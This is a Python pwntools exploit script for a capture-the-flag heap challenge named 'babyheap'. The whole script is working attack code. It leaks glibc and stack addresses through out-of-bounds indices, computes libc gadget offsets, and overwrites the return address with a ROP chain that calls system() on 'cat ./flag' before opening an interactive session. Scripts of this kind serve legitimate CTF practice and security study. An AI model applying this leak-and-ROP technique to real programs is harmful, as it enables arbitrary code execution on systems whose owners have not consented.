``` python
#!/usr/bin/python3.10
from pwn import *

# host = "172.31.3.2"
# port = 4241

# p = remote(host, port)
p = process('./babyheap/chal/share/chal')


def malloc(index, size) :
    print('-------------------------- malloc --------------------------')
    p.send(b"1")
    p.recvuntil("index > ")
    p.sendline(index.encode())
    # p.sendline()
    p.recvuntil("size > ")
    p.sendline(size.encode())

def free(index) :
    print('-------------------------- free --------------------------')
    p.sendline(b'2')
    p.recvuntil("index > ")
    p.sendline(index.encode())


def edit(index, size , payload) :
    print('-------------------------- edit --------------------------')
    p.send(b"3")
    p.recvuntil("index > ")
    p.sendline(index.encode())
    p.recvuntil("size > ")
    p.sendline(size.encode())
    p.recvuntil("content > ")
    p.send(payload)

def view(index) :
    print('-------------------------- view --------------------------')
    p.send(b'4')
    p.recvuntil("index > ")
    p.sendline(index.encode())
    output = p.recvuntil(b"\x7f\x00\x00", timeout=4)
    return output    


def view_stack(index) :
    print('-------------------------- view --------------------------')
    p.send(b'4')
    p.recvuntil("index > ")
    p.sendline(index.encode())
    output = p.recvline(timeout=4)
    return output 



def _exit() :
    print('-------------------------- exit --------------------------')
    p.sendline(b'5')

print(p.recvuntil("5. exit"))
# gdb.attach(p)
for _ in range(28, 31) :
    malloc(str(_), "100")


mem = view('-8')
print(mem)
# pause()
glibc_leak = mem[8:16]
stack_leak = mem[-8:]


# pause()
# glibc_leak = u64(glibc_leak.ljust(b"\x00"))
# stack_leak = u64(stack_leak.ljust(b"\x00"))
glibc_leak = int.from_bytes(glibc_leak, byteorder="little")
stack_leak = int.from_bytes(stack_leak, byteorder="little")

ret_addr = stack_leak - 0x140

print(hex(glibc_leak))
print(hex(stack_leak))
print("return addr : ", hex(ret_addr))

first_half_stack_addr = stack_leak & 0xffffffff
second_half_srack_addr = stack_leak & 0xffffffff00000000
second_half_srack_addr >>= 32
print(hex(first_half_stack_addr))
print(hex(second_half_srack_addr))


malloc("0", str(first_half_stack_addr))
malloc("1", str(second_half_srack_addr))

payload = b"cat ./flag"
edit("32", str(len(payload)), payload)

# print("---------------------- view stakc--------------------------------------------------")
# output = view_stack("-11")
# bss_addr = output[:8]
# bss_addr = int.from_bytes(bss_addr, byteorder="little")
# print(hex(bss_addr))

# exit_addr = bss_addr - 0x38

first_half_stack_addr = ret_addr & 0xffffffff
second_half_srack_addr = ret_addr & 0xffffffff00000000
second_half_srack_addr >>= 32
malloc("0", str(first_half_stack_addr))
malloc("1", str(second_half_srack_addr))


system_libc_offset = 0x1caa93
system_addr = glibc_leak - system_libc_offset

libc_base = glibc_leak - 0x21b803
pop_rdi_gadget = libc_base + 0x2a3e5
pop_rdi_gadget = p64(pop_rdi_gadget, endianness="little")
nop_gadget = libc_base + 0x00000000000378df
nop_gadget = p64(nop_gadget, endianness="little")


print("system addr : ", hex(system_addr))
system_addr = p64(system_addr, endianness="little")
payload = nop_gadget + pop_rdi_gadget + p64(stack_leak, endianness="little") + system_addr
# pause()
edit("32", str(len(payload)), payload)

p.interactive()



### pop rdi; ret              0x000000000002a3e5
